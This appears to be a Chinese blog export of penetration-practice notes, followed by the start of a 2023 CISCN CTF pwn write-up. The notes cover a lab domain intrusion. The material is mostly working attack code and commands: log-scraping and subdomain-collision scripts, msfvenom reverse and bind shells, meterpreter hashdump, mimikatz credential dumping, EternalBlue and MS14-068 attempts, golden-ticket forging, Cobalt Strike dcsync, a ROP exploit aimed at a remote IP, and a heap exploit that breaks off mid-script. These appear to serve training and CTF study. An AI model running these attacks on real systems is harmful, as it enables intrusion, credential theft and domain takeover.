<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://www.webhack123.com/App/Runtime/Logs/&quot;</span></span><br><span class="line">l = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_url</span>(<span class="params">year</span>):</span><br><span class="line">    <span class="keyword">for</span> mou <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">        <span class="keyword">for</span> day <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            <span class="keyword">if</span> mou &lt; <span class="number">10</span> :</span><br><span class="line">                <span class="keyword">if</span> day &lt; <span class="number">10</span> :</span><br><span class="line">                    tmp = url + <span class="built_in">str</span>(year) + <span class="string">&quot;_0&quot;</span> + <span class="built_in">str</span>(mou) + <span class="string">&quot;_0&quot;</span> + <span class="built_in">str</span>(day) + <span class="string">&quot;.log&quot;</span></span><br><span class="line">                <span class="keyword">else</span> :</span><br><span class="line">                    tmp = url + <span class="built_in">str</span>(year) + <span class="string">&quot;_0&quot;</span> + <span class="built_in">str</span>(mou) + <span class="string">&quot;_&quot;</span> + <span class="built_in">str</span>(day) + <span class="string">&quot;.log&quot;</span></span><br><span class="line">            <span class="keyword">else</span> :</span><br><span class="line">                <span class="keyword">if</span> day &lt; <span class="number">10</span> :</span><br><span class="line">                    tmp = url + <span class="built_in">str</span>(year) + <span class="string">&quot;0&quot;</span> + <span class="built_in">str</span>(mou) + <span class="string">&quot;_0&quot;</span> + <span class="built_in">str</span>(day) + <span class="string">&quot;.log&quot;</span></span><br><span class="line">                <span class="keyword">else</span> :</span><br><span class="line">                    tmp = url + <span class="built_in">str</span>(year) + <span class="string">&quot;0&quot;</span> + <span class="built_in">str</span>(mou) + <span class="string">&quot;0&quot;</span> + <span class="built_in">str</span>(day) + <span class="string">&quot;.log&quot;</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> tmp <span class="keyword">not</span> <span class="keyword">in</span> l:</span><br><span class="line">                rs = requests.get(tmp)</span><br><span class="line">                <span class="keyword">if</span> rs.status_code == <span class="number">200</span>:</span><br><span class="line">                    l.append(tmp)</span><br><span class="line">                    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;db_log.txt&quot;</span>, <span class="string">&quot;a&quot;</span>, encoding = <span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f :</span><br><span class="line">                        f.write(rs.text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> l:</span><br><span class="line">        <span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line">get_url(<span class="number">19</span>)</span><br><span class="line">get_url(<span class="number">20</span>)</span><br><span class="line">get_url(<span class="number">21</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230530200053976.png" alt="image-20230530200053976"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230530200120533.png" alt="image-20230530200120533"></p>
<p>学习一下绑定 hosts 碰后台的技巧。为了安全起见，目标会在自己的服务器的 hosts 上绑定一个后台的子域名，而非在公网上申请一个后台的子域名，这样只有他自己的服务器能够访问，而攻击者不能访问到。但是当我们不断修改攻击机上的 hosts 文件，只要能够成功找到目标 IP，那么就实现了子域名的碰撞。</p>
<p><a href="https://github.com/fofapro/Hosts_scan">fofapro&#x2F;Hosts_scan: 这是一个用于IP和域名碰撞匹配访问的小工具，旨意用来匹配出渗透过程中需要绑定hosts才能访问的弱主机或内部系统。 (github.com)</a></p>
<p>由于上述工具的测试体量太少了，自己写了一个生成 host 的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">l = sys.argv</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(l) != <span class="number">3</span> :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;&#x27;[*]Usage: python get_ip.py &lt;your domain&gt; &lt;your wordlist&gt;&#x27;&#x27;&#x27;</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">domain = l[<span class="number">1</span>]</span><br><span class="line">wordlist = l[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(wordlist, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;host.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> rs:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            line = line.strip()</span><br><span class="line">            tmp = line + <span class="string">&#x27;.&#x27;</span> + domain</span><br><span class="line">            rs.write(tmp + <span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python IP_hosts_scan_multithreading.py</span><br><span class="line">grep -v 403 ./hosts_ok.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230530204935809.png" alt="image-20230530204935809"></p>
<p>成功找到了后台的域名<code>admin.webhack123.com</code>，利用之前日志文件里的用户和密码进入后台。</p>
<p>设置上传文件类型直接成功上传文件。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230530205459255.png" alt="image-20230530205459255"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230624150841920.png" alt="image-20230624150841920"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.8.129 lport=5555 -f exe &gt; shell.exe</span><br><span class="line"></span><br><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.8.139</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 5555</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">meterpreter &gt; ps</span><br><span class="line">meterpreter &gt; migrate 476</span><br><span class="line"></span><br><span class="line">meterpreter &gt; hashdump</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; creds_all</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230531164357068.png" alt="image-20230531164357068"></p>
<h2 id="内网域渗透"><a href="#内网域渗透" class="headerlink" title="内网域渗透"></a>内网域渗透</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;chcp 65001</span><br><span class="line">C:\Windows\system32&gt;ipconfig /all</span><br></pre></td></tr></table></figure>

<p>发现域环境，一般域控和 dns 都在同一个服务器上。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230531165056002.png" alt="image-20230531165056002"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_domain		# 寻找域控</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_logged_on_users		# 查找登录过的用户信息</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;net config workstation		# 查看是否在域环境内</span><br><span class="line">C:\Windows\system32&gt;net view		# 遍历信任主机</span><br><span class="line">C:\Windows\system32&gt;net time /domain		# 查看域控时间</span><br><span class="line">C:\Windows\system32&gt;net view /domain		# 查看域</span><br><span class="line">C:\Windows\system32&gt;net group /domain		# 查看域组</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230624160243731.png" alt="image-20230624160243731"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; use auxiliary/server/socks_proxy</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; run</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; jobs</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run autoroute -s 10.10.10.0/24</span><br><span class="line"></span><br><span class="line">sudo proxychains4 nmap -sT -Pn 10.10.10.149</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230531183749306.png" alt="image-20230531183749306"></p>
<p>发现 445 端口，尝试永恒之蓝，但是无法攻击成功。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(server/socks_proxy) &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 10.10.10.149</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set lport 8888</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br></pre></td></tr></table></figure>

<p>PAC 是用来验证 Client 的访问权限的，它会被放在 TGT 里发送给 Client，然后由 Client 发送给 TGS。MS14-068 是密钥分发中心（KDC）服务中的漏洞。它允许经过身份验证的用户在其 Kerberos 票证（TGT）中<strong>插入任意的 PAC</strong>（表示所有用户权限的结构）。<strong>普通用户可以通过呈现具有改变了 PAC 的 Kerberos TGT 来获得票证，进而伪造票据获得管理员权限。</strong></p>
<p>主要满足三个条件：</p>
<ul>
<li>域控没有打 MS14-068 的补丁(KB3011780)</li>
<li>拿下一台加入域的计算机</li>
<li>有这台域内计算机的域用户密码和 SID</li>
</ul>
<p>在这里，存在主机为 web，存在域普通用户为 web，web 主机的系统管理员为 administrator，两者的密码可能相等。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启远程桌面，尝试 WEB\administrator 和 hackbox\web 的密码是否相同</span></span><br><span class="line">meterpreter &gt; run post/windows/manage/enable_rdp </span><br><span class="line">rdesktop 192.168.8.139</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建票据</span></span><br><span class="line">ms14-068.exe -u web@hackbox.com -s S-1-5-21-2005268815-658469957-1189185684-1103 -d 10.10.10.149 -p !@#Qwe456</span><br><span class="line"></span><br><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">meterpreter &gt; kerberos_ticket_purge		# 清理票据</span><br><span class="line">meterpreter &gt; kerberos_ticket_list		# 查看当前凭证</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不过 meterpreter 中的 kiwi 模块没有更新票据的功能</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://github.com/ParrotSec/mimikatz">GitHub - ParrotSec&#x2F;mimikatz</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">privilege::debug				# 提升至 DebugPrivilege 权限</span><br><span class="line">sekurlsa::logonpasswords			# 导出用户凭据</span><br><span class="line">sekurlsa::wdigest</span><br><span class="line"></span><br><span class="line">kerberos::list					# 列出用户票据</span><br><span class="line">kerberos::purge					# 清除系统中的票据</span><br><span class="line">kerberos::ptc &lt;path&gt;				# 导入票据到系统中</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mimikatz # kerberos::ptc ./TGT_web@hackbox.com.ccache</span><br></pre></td></tr></table></figure>

<p>最终成功访问到了域控。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230624184812994.png" alt="image-20230624184812994"></p>
<p>接下来就是拿到域控的 shell。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp lport=13777 -f exe &gt; bind.exe		# 正向</span><br><span class="line"></span><br><span class="line">meterpreter &gt; upload /home/pursue/anyue/practice6/bind.exe</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">C:\Users\Administrator\Desktop&gt;copy bind.exe \\dc\c$\</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">AT 命令可在指定时间和日期、在指定计算机上运行命令和程序（仅当计划服务正在运行时，才能使用 at）</span></span><br><span class="line">C:\Users\Administrator\Desktop&gt;net time \\dc		# 查看 \\dc 时间</span><br><span class="line">C:\Users\Administrator\Desktop&gt;at \\dc 19:10:00 c:/bind.exe			# 创造任务执行</span><br><span class="line">C:\Users\Administrator\Desktop&gt;at \\dc			# 查看任务计划</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230626103749186.png" alt="image-20230626103749186"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(server/socks_proxy) &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/bind_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 13777</span><br><span class="line">msf6 exploit(multi/handler) &gt; set rhost 10.10.10.149</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230626103854117.png" alt="image-20230626103854117"></p>
<p>学习一下黄金票据的利用。在 Windows 的 kerberos 认证过程中，Client 将自己的信息发送给 KDC，然后 KDC 使用 krbtgt 用户的 Hash 作为密钥进行加密，生成 TGT 。那么如果获取到了 krbtgt 的 Hash 值，不就可以伪造任意的 TGT 了吗。<strong>因为 krbtgt 只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限，黄金凭据可以理解为一个后门。</strong></p>
<p>主要满足以下条件：</p>
<ul>
<li>krbtgt 的 NTLM Hash</li>
<li>完整的域名和域SID</li>
<li>需要伪造的域管理员用户名</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # lsadump::lsa /patch</span><br><span class="line">mimikatz # kerberos::golden /admin:pursue /domain:hackbox.com /sid:S-1-5-21-2005268815-658469957-1189185684 /krbtgt:6f60ace6accbcb76078ccc0312174e98 /ticket:ticket.kirbi		# 生成黄金票据</span><br><span class="line">mimikatz # kerberos::ptt ticket.kirbi</span><br><span class="line"></span><br><span class="line">meterpreter &gt; kerberos_ticket_purge</span><br><span class="line">meterpreter &gt; golden_ticket_create -d hackbox.com -u pursue -s S-1-5-21-2005268815-658469957-1189185684 -k 6f60ace6accbcb76078ccc0312174e98 -t /tmp/krbtgt.ticket		# 生成黄金票据</span><br><span class="line">meterpreter &gt; kerberos_ticket_use /tmp/krbtgt.ticket</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230626125943601.png" alt="image-20230626125943601"></p>
<h2 id="cobaltstrike"><a href="#cobaltstrike" class="headerlink" title="cobaltstrike"></a>cobaltstrike</h2><p>主要记录一些命令，软件多操作几遍就熟悉了。</p>
<blockquote>
<p>将 ccache 转化为 kirbi：<a href="https://github.com/rvazarkar/KrbCredExport">GitHub - rvazarkar&#x2F;KrbCredExport: Exports Kerberos KrbCred Tickets for use in Mimikatz&#x2F;Beacon from a Kerberos CCache File</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./teamserver 192.168.8.129 123456</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">shell <span class="built_in">whoami</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash"><span class="built_in">help</span> net</span></span><br><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">net view</span></span><br><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">net domain</span></span><br><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">net computers</span></span><br><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">net dclist</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash"><span class="built_in">link</span> dc</span></span><br><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">dcsync hackbox.com hackbox\krbtgt</span></span><br></pre></td></tr></table></figure>







]]></content>
      <categories>
        <category>Penetration</category>
      </categories>
      <tags>
        <tag>暗月</tag>
      </tags>
  </entry>
  <entry>
    <title>2023 ciscn 初赛</title>
    <url>/2023/06/04/CTF/2023ciscn%E5%88%9D%E8%B5%9B/</url>
    <content><![CDATA[<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="烧烤摊"><a href="#烧烤摊" class="headerlink" title="烧烤摊"></a>烧烤摊</h3><span id="more"></span>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">3</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./shaokao&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./shaokao&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(<span class="string">&quot;123.56.236.235&quot;</span>, <span class="number">44947</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./shaokao&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shaokao</span>(<span class="params">num</span>):</span><br><span class="line">    sla(<span class="string">&quot;&gt; &quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;3. 勇闯天&quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;来几瓶？&quot;</span>, <span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vip</span>():</span><br><span class="line">    sla(<span class="string">&quot;&gt; &quot;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vul</span>(<span class="params">name</span>):</span><br><span class="line">    sla(<span class="string">&quot;&gt; &quot;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;请赐名：\n&quot;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(asm(&quot;syscall;ret&quot;))</span></span><br><span class="line">bss = <span class="number">0x00000000004E9CC0</span></span><br><span class="line">p_rdi_r = <span class="number">0x000000000040264f</span></span><br><span class="line">p_rsi_r = <span class="number">0x000000000040a67e</span></span><br><span class="line">p_rdx_rbx_r = <span class="number">0x00000000004a404b</span></span><br><span class="line">p_rax_r = <span class="number">0x0000000000458827</span></span><br><span class="line">syscall_ret = <span class="number">0x00000000004230a6</span></span><br><span class="line"></span><br><span class="line">shaokao(-<span class="number">10000</span>)</span><br><span class="line">vip()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">40</span></span><br><span class="line">payload += p64(p_rdi_r) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(p_rsi_r) + p64(bss)</span><br><span class="line">payload += p64(p_rax_r) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(p_rdx_rbx_r) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line">payload += p64(p_rdi_r) + p64(bss)</span><br><span class="line">payload += p64(p_rsi_r) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(p_rdx_rbx_r) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(p_rax_r) + p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">vul(payload)</span><br><span class="line">s(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="StrangeTalkBot"><a href="#StrangeTalkBot" class="headerlink" title="StrangeTalkBot"></a>StrangeTalkBot</h3><p>该题的难点不在于后面堆菜单的部分，而是在前面检查我们输入的部分，最后也是在高人的指点下做了出来。</p>
<p>进入到 sub_5090 函数，会发现一些奇怪的字符串。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230528182714373.png" alt="image-20230528182714373"></p>
<p>上网搜索一下，搜到一个叫<code>protobuf-c</code>的玩意儿。</p>
<blockquote>
<p><a href="https://blog.csdn.net/vegeta852/article/details/111935914">(32条消息) protobuf-c 基本使用及样例_protobufcmessage_vegeta852的博客-CSDN博客</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1199069">高效的数据压缩编码方式 Protobuf-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
</blockquote>
<p>简单来说，我们可以利用 Protobuf 定义一个结构化数据的文档，然后通过调用这个文档并进行序列化，达到传输数据的目的。在这里，我们就可以猜测到程序需要我们输入的就是这个序列化之后的数据。那怎么实现这个过程呢？接着搜索。</p>
<blockquote>
<p><a href="https://loora1n.github.io/2022/11/01/%E3%80%90%E7%A5%A5%E4%BA%91%E6%9D%AF2022%E3%80%91PWN-WriteUp-protocol/">【祥云杯2022】PWN-WriteUp-protocol - 鷺雨のBlog (loora1n.github.io)</a></p>
</blockquote>
<p>按照上述文章的步骤即可得到对应的<code>ctf.proto</code>和<code>ctf_pb2.py</code>，其中前者的内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">syntax = &quot;proto2&quot;;</span><br><span class="line"></span><br><span class="line">package Devicemsg;</span><br><span class="line"></span><br><span class="line">message parse_member &#123;</span><br><span class="line">    optional int64 actionid = 1;</span><br><span class="line">    optional int64 msgidx = 2;</span><br><span class="line">    optional int64 msgsize = 3;</span><br><span class="line">    optional bytes msgcontent = 4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> ctf_pb2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proto</span>(<span class="params"><span class="built_in">id</span>, idx, size, content</span>):</span><br><span class="line">    ctf = parse_member()</span><br><span class="line">    ctf.actionid = <span class="built_in">id</span> * <span class="number">2</span></span><br><span class="line">    ctf.msgidx = idx * <span class="number">2</span></span><br><span class="line">    ctf.msgsize = size * <span class="number">2</span>  <span class="comment"># &lt;= 0xf1</span></span><br><span class="line">    <span class="comment"># ctf.msgcontent_size</span></span><br><span class="line">    ctf.msgcontent = content</span><br><span class="line">    sa(<span class="string">&quot;with me now: &quot;</span>, ctf.SerializeToString())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    proto(<span class="number">1</span>, idx, size, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    proto(<span class="number">3</span>, idx, <span class="number">0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    proto(<span class="number">2</span>, idx, size, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    proto(<span class="number">4</span>, idx, <span class="number">0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span 